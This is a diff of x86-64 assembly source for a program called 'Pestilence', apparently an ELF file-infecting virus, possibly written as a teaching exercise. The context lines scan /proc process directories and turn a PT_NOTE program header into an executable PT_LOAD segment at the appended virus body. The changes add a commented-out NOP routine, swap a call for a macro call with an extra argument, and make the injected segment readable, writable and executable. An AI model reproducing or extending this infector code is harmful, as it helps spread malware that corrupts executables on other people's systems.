@@ -12,6 +12,41 @@ section .text
 
 ; ----------------------------------------- routines -------------------------------------------------------------------
 
+    ; taeiou:
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     nop
+    ;     ret        
+    ; .taeiou_end:
+
+
+
     directory_name_isdigit:
         ; rdi = puntero dirent_buffert
         push rbx
@@ -80,6 +115,7 @@ section .text
         jle .jump_to_host
         mov VAR(Pestilence.fd_proc), rax
 
+    ;    CALL taeiou, 0x1e
     .dirent_proc:
          ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
         mov rdi, VAR(Pestilence.fd_proc)
@@ -110,7 +146,7 @@ section .text
         jne .check_dir_in_proc
 
         ; comprobamos que el nombre del directorio se corresponde con un PID
-        call directory_name_isdigit
+        CALL directory_name_isdigit, 0x1e
         cmp al, 0
 
         jne .check_dir_in_proc
@@ -485,7 +521,8 @@ section .text
         lea rax, VAR(Pestilence.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R
+        mov [rax+Elf64_Phdr.p_flags], 0x07               
+       ; mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R
         mov ecx, dword VAR(Pestilence.file_final_len)
         sub ecx, dword VAR(Pestilence.virus_size)
         mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
